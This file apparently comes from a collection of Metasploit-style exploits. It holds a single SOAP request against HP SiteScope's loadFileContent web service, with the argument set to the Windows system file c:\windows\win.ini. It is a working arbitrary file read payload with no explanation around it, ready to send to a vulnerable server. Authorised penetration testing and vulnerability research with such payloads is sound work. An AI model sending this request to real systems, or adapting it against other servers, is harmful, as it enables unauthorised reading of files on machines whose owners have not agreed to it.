MSFExploits/ExploitsMSF/HP/MSF/src/HpSitescopeLoadfilecontentFileaccess.payload

<?xml version=\'1.0\' encoding=\'UTF-8\'?>
<wsns0:Envelope
xmlns:wsns1=\'http://www.w3.org/2001/XMLSchema-instance\'
xmlns:xsd=\'http://www.w3.org/2001/XMLSchema\'
xmlns:wsns0=\'http://schemas.xmlsoap.org/soap/envelope/\'
>
<wsns0:Body
wsns0:encodingStyle=\'http://schemas.xmlsoap.org/soap/encoding/\'
>
<impl:loadFileContent
xmlns:impl=\'http://Api.freshtech.COM\'
>
<in0
xsi:type=\'xsd:string\'
xmlns:xsi=\'http://www.w3.org/2001/XMLSchema-instance\'
>c:\windows\win.ini</in0>
</impl:loadFileContent>
</wsns0:Body>
</wsns0:Envelope>
